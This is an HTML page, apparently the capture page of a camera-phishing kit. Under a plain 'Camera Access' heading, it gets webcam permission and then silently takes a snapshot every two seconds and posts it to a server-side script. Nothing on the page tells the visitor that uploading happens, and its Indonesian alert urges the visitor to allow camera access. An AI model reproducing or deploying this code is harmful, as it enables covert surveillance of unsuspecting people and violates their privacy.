<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Camera</title>
</head>
<body>
<h2>Camera Access</h2>
<video id="video" width="640" height="480" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;

        setInterval(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
            $.post("post.php", { cam_image: imgData });
        }, 2000); // Kirim snapshot tiap 2 detik
    } catch(err) {
        console.error("Gagal akses kamera:", err);
        alert("Browser tidak bisa akses kamera. Izinkan akses kamera!");
    }
}

initCamera();
</script>
</body>
</html>
